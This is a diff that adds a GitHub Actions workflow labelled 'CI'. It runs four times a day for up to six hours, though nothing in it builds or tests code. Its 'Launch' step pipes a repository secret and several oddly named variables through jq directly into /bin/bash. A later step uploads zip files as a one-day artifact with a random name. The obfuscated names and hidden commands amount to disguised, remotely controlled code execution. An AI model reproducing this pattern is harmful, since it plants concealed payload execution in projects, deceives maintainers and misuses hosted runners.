@@ -1,0 +1,33 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '33 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          v9922: ${{ secrets.v9922 }}
+        run: |
+          printf '%s' "$v9922" | jq -r .qqw2747 | /bin/bash
+          printf '%s' "$h8" | jq -r .ukgrn965 | /bin/bash
+          echo $v5469 | jq -r .ygmww4027 | /bin/bash
+          printf '%s' "$lks9355" | jq -r .rbmr7 | /bin/bash
+          echo $srn83581 | jq -r .cibf9 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: RtiFFZyc
+          path: "*.zip"
+          retention-days: 1
